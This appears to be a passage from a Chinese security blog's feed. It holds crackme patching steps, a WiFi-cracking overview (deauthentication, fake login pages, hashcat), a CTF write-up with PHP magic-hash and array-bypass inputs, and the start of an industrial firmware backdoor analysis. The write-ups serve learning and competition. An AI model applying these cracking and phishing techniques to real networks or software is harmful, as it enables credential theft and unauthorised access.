href="https://i.loli.net/2018/07/15/5b4b5e1988ab5.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5e1988ab5.jpg" class="lazyload"></a></p><p>记录下这个位置也是一个需要破解的点。</p><pre><code>综上所述，我们可以看到这个程序有三个点需要破解：1，程序主界面之前的一个NAG窗口2，Serial/Name校验页面3，Serial校验页面</code></pre><h2 id="NAG窗口去除"><a href="#NAG窗口去除" class="headerlink" title="NAG窗口去除"></a>NAG窗口去除</h2><p><a href="https://i.loli.net/2018/07/15/5b4b5e19ae1dd.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5e19ae1dd.jpg" class="lazyload"></a><br>直接F8，在0042FD97call弹窗，于是在此F2，重新运行，在断点处F7进入，继续F8<br><a href="https://i.loli.net/2018/07/15/5b4b5e19d2c68.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5e19d2c68.jpg" class="lazyload"></a><br>在00429FC2处再次弹窗，于是再次下断点并从这里进入<br><a href="https://i.loli.net/2018/07/15/5b4b5e1a0480b.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5e1a0480b.jpg" class="lazyload"></a><br>在0042563D处再次弹窗<br>这里可以看到有个je跳转，我们只要强行跳转就可以去除弹窗了</p><h2 id="Serial-Name窗口破解"><a href="#Serial-Name窗口破解" class="headerlink" title="Serial/Name窗口破解"></a>Serial/Name窗口破解</h2><p>在name和serial输入框随意输入一个字符串和序列号时，此时点击Check it Baby，会弹出try again窗口，内容是sorry，the serial is incorect。</p><p>于是我们搜索字符串<br><a href="https://i.loli.net/2018/07/15/5b4b5e1a29451.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5e1a29451.jpg" class="lazyload"></a><br>这里一个是Serial的提示，一个是Serial/Name的提示，通过试验找到Serial/Name的提示语句位置如下<br><a href="https://i.loli.net/2018/07/15/5b4b5e1a6b167.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5e1a6b167.jpg" class="lazyload"></a><br>0042FB03处的jnz直接跳到jmp下面，也就是说将会提示错误，所以我们只需要nop掉jnz即可</p><h2 id="Serial窗口破解"><a href="#Serial窗口破解" class="headerlink" title="Serial窗口破解"></a>Serial窗口破解</h2><p>和Serial/Name的结构是一样的，直接nop即可</p><h1 id="注册机算法（待补充）"><a href="#注册机算法（待补充）" class="headerlink" title="注册机算法（待补充）"></a>注册机算法（待补充）</h1>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;001-Acid-burn-exe&quot;&gt;&lt;a href=&quot;#001-Acid-burn-exe&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>对WiFi密码安全的基础认识</title>
    <link href="https://kabeor.github.io/%E5%AF%B9WiFi%E5%AF%86%E7%A0%81%E5%AE%89%E5%85%A8%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%86/"/>
    <id>https://kabeor.github.io/%E5%AF%B9WiFi%E5%AF%86%E7%A0%81%E5%AE%89%E5%85%A8%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%86/</id>
    <published>2018-07-18T16:00:00.000Z</published>
    <updated>2020-03-16T04:32:18.570Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对WiFi密码安全的基础认识"><a href="#对WiFi密码安全的基础认识" class="headerlink" title="对WiFi密码安全的基础认识"></a>对WiFi密码安全的基础认识</h1><p>这篇文章是测试WiFi渗透和密码破解常用步骤的简单记录</p><h2 id="1-抓取握手包"><a href="#1-抓取握手包" class="headerlink" title="1. 抓取握手包"></a>1. 抓取握手包</h2><p>一般常用</p><blockquote><p>aircrack-ng<br>Fluxion <a href="https://www.jianshu.com/p/d16e86c41336" target="_blank" rel="noopener">https://www.jianshu.com/p/d16e86c41336</a><br>其他 <a href="http://www.4hou.com/tools/5584.html" target="_blank" rel="noopener">http://www.4hou.com/tools/5584.html</a></p></blockquote><p>比较有意思的是用社工思路，将用户攻击掉线，伪装登陆页面，骗取用户WiFi密码，省去了爆破的时间</p><blockquote><p>airgeddon <a href="https://www.77169.com/html/211103.html" target="_blank" rel="noopener">https://www.77169.com/html/211103.html</a></p></blockquote><h3 id="如何将用户断开AP？"><a href="#如何将用户断开AP？" class="headerlink" title="如何将用户断开AP？"></a>如何将用户断开AP？</h3><p>方式有很多，后期会渐渐补充</p><blockquote><p>Deauthentication Attack Detection（取消身份验证洪水攻击） <a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247485872&amp;idx=1&amp;sn=b1ad127f059c29cbb7aee2b2a05b1461&amp;chksm=ec1e3998db69b08e8bea181bc2edf6cc511fe40fe712b340d229c72a9508b8a9a44d19d276ec&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247485872&amp;idx=1&amp;sn=b1ad127f059c29cbb7aee2b2a05b1461&amp;chksm=ec1e3998db69b08e8bea181bc2edf6cc511fe40fe712b340d229c72a9508b8a9a44d19d276ec&amp;scene=21#wechat_redirect</a></p></blockquote><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><blockquote><p>Wifi 四次握手认证与暴力破解 <a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247487683&amp;idx=1&amp;sn=8f5ef4ed5e6d352aa7d4790b72e2436f&amp;chksm=ec1e20ebdb69a9fde2226d345531ef851b76729e92fc58a8d2efb18fd5f396b65a4c932f1437&amp;mpshare=1&amp;scene=23&amp;srcid=0623Ur6TPTgg2hrkZfZgdOeb#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247487683&amp;idx=1&amp;sn=8f5ef4ed5e6d352aa7d4790b72e2436f&amp;chksm=ec1e20ebdb69a9fde2226d345531ef851b76729e92fc58a8d2efb18fd5f396b65a4c932f1437&amp;mpshare=1&amp;scene=23&amp;srcid=0623Ur6TPTgg2hrkZfZgdOeb#rd</a></p></blockquote><p>跑字典非常考验硬件性能，和字典的有效性也密不可分<br>aircrack-ng套件中就有该功能</p><p>如果使用GPU超强的运算速度进行暴力密码破解效率就会提升很多</p><p>HashCat应该目前最好的GPU破解HASH的软件</p><blockquote><p><a href="https://www.77169.com/html/211124.html" target="_blank" rel="noopener">https://www.77169.com/html/211124.html</a></p></blockquote>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;对WiFi密码安全的基础认识&quot;&gt;&lt;a href=&quot;#对WiFi密码安全的基础认识&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="Web" scheme="https://kabeor.github.io/categories/Web/"/>
    
    
    <category term="WiFi安全" scheme="https://kabeor.github.io/tags/WiFi%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>对强网杯2018“Web签到”的思考</title>
    <link href="https://kabeor.github.io/%E5%AF%B9%E5%BC%BA%E7%BD%91%E6%9D%AF2018%E2%80%9CWeb%E7%AD%BE%E5%88%B0%E2%80%9D%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>https://kabeor.github.io/%E5%AF%B9%E5%BC%BA%E7%BD%91%E6%9D%AF2018%E2%80%9CWeb%E7%AD%BE%E5%88%B0%E2%80%9D%E7%9A%84%E6%80%9D%E8%80%83/</id>
    <published>2018-07-18T16:00:00.000Z</published>
    <updated>2020-03-16T04:31:30.197Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对强网杯2018“Web签到”的思考"><a href="#对强网杯2018“Web签到”的思考" class="headerlink" title="对强网杯2018“Web签到”的思考"></a>对强网杯2018“Web签到”的思考</h1><p>题目地址：  <a href="http://39.107.33.96:10000/" target="_blank" rel="noopener">http://39.107.33.96:10000/</a></p><p>题目共分为三层</p><ol><li>PHP处理0e开头的md5哈希字符串的缺陷</li><li>MD5函数不能处理数组</li><li>字符串md5碰撞<h2 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h2><a href="https://i.loli.net/2018/07/19/5b50207c83973.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50207c83973.jpg" class="lazyload"></a><br>我们查看源码，可以找到<br><a href="https://i.loli.net/2018/07/19/5b50207c9c081.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50207c9c081.jpg" class="lazyload"></a></li></ol><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!=$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>])==md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"success!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div><p>这里PHP在处理哈希字符串时，利用”==”来对哈希值进行比较，把每一个以”0E”开头的哈希值都解释为0，因此如果两个不同的密码经过哈希以后，其哈希值都是以”0e”开头的，那么PHP将会认为它们都是0。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在PHP中，e可以指幂，因此</p><pre><code>0e123456   等价于   0*10^123456</code></pre><p>0乘任何数等于零，因此0e开头的md5全部等于0，也就做到了这里的</p><pre><code>md5($_POST[&apos;param1&apos;])==md5($_POST[&apos;param2&apos;]</code></pre><p>这里我使用的是</p><blockquote><p>s878926199a     md5: 0e545993274517709034328855841020<br>s155964671a     md5: 0e342768416822451524974117254469</p></blockquote><h2 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h2><p><a href="https://i.loli.net/2018/07/19/5b50207caf867.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50207caf867.jpg" class="lazyload"></a><br>查看源码<br><a href="https://i.loli.net/2018/07/19/5b50207cc168b.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50207cc168b.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"success!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div><p>这里变成了===操作符，严格等于，因此我们无法利用0e<br>因此我们需要符合的条件为构建两个参数 使得他们类型或者值不相同 但哈希值相同</p><p>这里我们考虑到，PHP的md5函数用法如下</p><pre><code>md5(string,raw)</code></pre><blockquote><p>string    必需。规定要计算的字符串。</p></blockquote><blockquote><p>raw<br>可选。规定十六进制或二进制输出格式：<br>TRUE - 原始 16 字符二进制格式<br>FALSE - 默认。32 字符十六进制数</p></blockquote><blockquote><p>返回值：    如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE。</p></blockquote><p>因此，如果md5中的参数不是字符串（string），则会返回null<br>所以如果我们传入两个值不同的数组，就会出现</p><pre><code>null===null</code></pre><p>符合条件</p><p>使用Burpsuite抓包，传数组<br><a href="https://i.loli.net/2018/07/19/5b50207cd5201.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50207cd5201.jpg" class="lazyload"></a></p><h2 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h2><p><a href="https://i.loli.net/2018/07/19/5b50207ce709f.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50207ce709f.jpg" class="lazyload"></a><br>源码<br><a href="https://i.loli.net/2018/07/19/5b50207d0abe5.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50207d0abe5.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">if((string)$_POST[&#39;param1&#39;]!&#x3D;&#x3D;(string)$_POST[&#39;param2&#39;] &amp;&amp; md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123;</span><br><span class="line">die(&quot;success!);</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div><p>这次PHP将两个参数强行转成string.</p><p>没有漏洞，我们只能考虑md5碰撞</p><h3 id="原理（个人理解，如有错误请指正）"><a href="#原理（个人理解，如有错误请指正）" class="headerlink" title="原理（个人理解，如有错误请指正）"></a>原理（个人理解，如有错误请指正）</h3><p>2005年王小云提出了md5哈希碰撞，公式如下</p><pre><code>f(f(s, M), M&apos;) = f(f(s, N), N&apos;)</code></pre><p>先将明文进行64bit分组，不足的则填充，这样它的长度将是64字节的倍数。</p><p>接下来将其分为单个的64bit字节块M0, M1, …, Mn-1。</p><p>而md5的hash是由16字节的序列s0, …, sn来计算。计算规则为：si+1 = f(si, Mi) ，（i为角标）， f是一个固定函数。s0是初始化向量，sn是最终状态，即计算的md5 hash</p><p>对于给定的初始化向量s，找出两组M，M’和N，N’，使得f（f（s，M），M’）= f（f（s，N），N’）  ，重要的是这里不仅仅适用于标准初始化矢量s0，而对于任何初始化矢量s都适用。</p><p>也就是说对于两个不同的消息分组 M、N，s 相同，经过两次 f 函数后得到的结果是一样的。</p><p>因此可以找到任意长度的对文件，除了文件中间的128个字节，它们是相同的，而且它们具有相同的MD5散列。</p><p><a href="https://i.loli.net/2018/07/19/5b50207d22366.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50207d22366.jpg" class="lazyload"></a><br>为了便于理解，自己做了个图</p><p>m0 m1经过两次f函数所得的hash是相同的</p><p>如果对这个有兴趣，推荐下面的网站</p><p>md5相关知识： <a href="http://www.unixwiz.net/techtips/iguide-crypto-hashes.html" target="_blank" rel="noopener">http://www.unixwiz.net/techtips/iguide-crypto-hashes.html</a><br>可视化md5碰撞演示： <a href="http://www.links.org/?p=6" target="_blank" rel="noopener">http://www.links.org/?p=6</a><br>用相同的MD5散列创建两个PHP文件： <a href="https://natmchugh.blogspot.com/2014/10/how-i-made-two-php-files-with-same-md5.html" target="_blank" rel="noopener">https://natmchugh.blogspot.com/2014/10/how-i-made-two-php-files-with-same-md5.html</a><br>Are there two known strings which have the same MD5 hash value?： <a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value" target="_blank" rel="noopener">https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value</a></p><p>我们使用md5碰撞软件fastcoll生成两个md5相同的文件，经url编码后上传即可得到flag。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;对强网杯2018“Web签到”的思考&quot;&gt;&lt;a href=&quot;#对强网杯2018“Web签到”的思考&quot; class=&quot;headerlink&quot; title=&quot;对强网杯2018“Web签到”的思考&quot;&gt;&lt;/a&gt;对强网杯2018“Web签到”的思考&lt;/h1&gt;&lt;p&gt;题目地址：</summary>
        
      
    
    
    
    <category term="Web" scheme="https://kabeor.github.io/categories/Web/"/>
    
    <category term="WriteUP" scheme="https://kabeor.github.io/categories/Web/WriteUP/"/>
    
    
    <category term="writeup" scheme="https://kabeor.github.io/tags/writeup/"/>
    
    <category term="web" scheme="https://kabeor.github.io/tags/web/"/>
    
    <category term="PHP漏洞" scheme="https://kabeor.github.io/tags/PHP%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="md5" scheme="https://kabeor.github.io/tags/md5/"/>
    
  </entry>
  
  <entry>
    <title>施耐德NOE77101以太网模块固件逆向及后门挖掘</title>
    <link href="https://kabeor.github.io/%E6%96%BD%E8%80%90%E5%BE%B7NOE77101%E4%BB%A5%E5%A4%AA%E7%BD%91%E6%A8%A1%E5%9D%97%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%8F%8A%E5%90%8E%E9%97%A8%E6%8C%96%E6%8E%98/"/>
    <id>https://kabeor.github.io/%E6%96%BD%E8%80%90%E5%BE%B7NOE77101%E4%BB%A5%E5%A4%AA%E7%BD%91%E6%A8%A1%E5%9D%97%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%8F%8A%E5%90%8E%E9%97%A8%E6%8C%96%E6%8E%98/</id>
    <published>2018-07-18T16:00:00.000Z</published>
    <updated>2020-03-16T04:35:10.140Z</updated>
    
    <content type="html"><![CDATA[<h1 id="施耐德NOE77101以太网模块固件逆向及后门挖掘"><a href="#施耐德NOE77101以太网模块固件逆向及后门挖掘" class="headerlink" title="施耐德NOE77101以太网模块固件逆向及后门挖掘"></a>施耐德NOE77101以太网模块固件逆向及后门挖掘</h1><p>前几天参加了 2018工业信息安全技能大赛 ，之前从没有接触过工控安全，这次的比赛让我学习了很多。</p><p>此次比赛其中一道题就是考察了施耐德NOE77101固件后门账号漏洞的问题，比赛题目要求是提交该固件Web配置APP的默认账号的密码，事实上这个版本的固件还有其他漏洞，我将在下面研究其中的一部分。</p><blockquote><p>部分思路参考了此次比赛主办方灯塔实验室的文章 <a href="http://t.cn/RdORUWo" target="_blank" rel="noopener">http://t.cn/RdORUWo</a></p></blockquote><p>NOE 771是施耐德Quantum系列PLC的以太网模块，Quantum系列PLC是施耐德的高端PLC，应用在我国核心能源调度网络系统中，如：西气东输的区域子段SCADA系统。</p><h2 id="1-静态网站分析"><a href="#1-静态网站分析" class="headerlink" title="1.静态网站分析"></a>1.静态网站分析</h2><p>题目给了一个网站文件如下<br><a href="https://i.loli.net/2018/07/19/5b50212a8e4c2.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b50212a8e4c2.jpg" class="lazyload"></a></p><p><strong>文件列表</strong></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FLASH0</span><br><span class="line">FLASH0&#x2F;bin</span><br><span class="line">FLASH0&#x2F;ftp</span><br><span class="line">FLASH0&#x2F;fw</span><br><span class="line">FLASH0&#x2F;gdt</span><br><span class="line">FLASH0&#x2F;rdt</span><br><span class="line">FLASH0&#x2F;webloader.ini</span><br><span class="line">FLASH0&#x2F;wwwroot</span><br><span class="line">FLASH0&#x2F;bin&#x2F;$TMP_EMPTY_DIR</span><br><span class="line">FLASH0&#x2F;ftp&#x2F;$TMP_EMPTY_DIR</span><br><span class="line">FLASH0&#x2F;fw&#x2F;crashlog.txt</span><br><span class="line">FLASH0&#x2F;fw&#x2F;fw.ini &#x2F;&#x2F;固件版本</span><br><span class="line">FLASH0&#x2F;fw&#x2F;hw.ini</span><br><span class="line">FLASH0&#x2F;gdt&#x2F;$TMP_EMPTY_DIR</span><br><span class="line">FLASH0&#x2F;rdt&#x2F;password.rde &#x2F;&#x2F;调用密码</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;cgi-bin</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;classes</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;images</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;index.htm &#x2F;&#x2F;web首页文件</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;lib</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;SchneiderTFE.zip &#x2F;&#x2F;施耐德MIB文件</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;secure</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;unsecure</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;cgi-bin&#x2F;$TMP_EMPTY_DIR</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;classes&#x2F;jvmver.jar &#x2F;&#x2F;JAVA APP</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;classes&#x2F;RDE.jar &#x2F;&#x2F;JAVA APP</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;classes&#x2F;SAComm.jar &#x2F;&#x2F;JAVA APP</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;classes&#x2F;SysDiag.jar &#x2F;&#x2F;JAVA APP</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;classes&#x2F;webcfg.jar &#x2F;&#x2F;JAVA APP</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;classes&#x2F;webdiag.jar &#x2F;&#x2F;JAVA APP</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;classes&#x2F;XMLParser.jar&#x2F;&#x2F;JAVA APP</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;classes&#x2F;xmlrpc-1.1.jar &#x2F;&#x2F;JAVA APP</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;bootp</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;dhcp</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;diag</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;exec</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;fw</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;Gcnftcop.sys</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;glbdata</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;ioscanner</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;snmp</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;bootp&#x2F;$TMP_EMPTY_DIR</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;dhcp&#x2F;$TMP_EMPTY_DIR</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;diag&#x2F;$TMP_EMPTY_DIR</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;exec&#x2F;kerVer</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;exec&#x2F;NOE77101.bin &#x2F;&#x2F;Quantum Ethernet Executive firmware Ver. 3.60</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;fw&#x2F;fw.ini</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;glbdata&#x2F;glbdata.ini</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;ioscanner&#x2F;$TMP_EMPTY_DIR</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;conf&#x2F;snmp&#x2F;snmp.ini</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;config.js &#x2F;&#x2F;定义了WEB界面title可做通用设备识别</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;images</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;lib</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;control</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;diagnostic</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;documentation</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;header.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;home</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;index.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;maintenance</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;monitoring</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;setup</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;control&#x2F;index.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;control&#x2F;menu.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;diagnostic&#x2F;index.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;diagnostic&#x2F;menu.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;documentation&#x2F;index.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;documentation&#x2F;menu.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;home&#x2F;home.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;home&#x2F;index.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;home&#x2F;menu.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;maintenance&#x2F;index.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;maintenance&#x2F;menu.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;monitoring&#x2F;index.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;monitoring&#x2F;menu.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;setup&#x2F;index.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;english&#x2F;setup&#x2F;menu.htm</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;images&#x2F;noe77101.jpg &#x2F;&#x2F;产品型号图片</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;images&#x2F;Telemecanique.gif</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;images&#x2F;TelemecaniquePocketPC.gif</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;lib&#x2F;css</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;lib&#x2F;images</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;lib&#x2F;js</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;lib&#x2F;css&#x2F;header.css</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;lib&#x2F;css&#x2F;main.css</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;lib&#x2F;css&#x2F;menu.css</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;lib&#x2F;images&#x2F;left.gif</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;lib&#x2F;images&#x2F;moins.gif</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;lib&#x2F;images&#x2F;plus.gif</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;lib&#x2F;images&#x2F;right.gif</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;lib&#x2F;js&#x2F;header.js</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;lib&#x2F;js&#x2F;home.js</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;lib&#x2F;js&#x2F;index.js</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;lib&#x2F;js&#x2F;menu.js</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;html&#x2F;lib&#x2F;js&#x2F;tools.js</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;images&#x2F;eight_io.gif</span><br><span class="line">FLASH0&#x2F;wwwroot&#x2F;images&#x2F;empty.gif</span><br><span 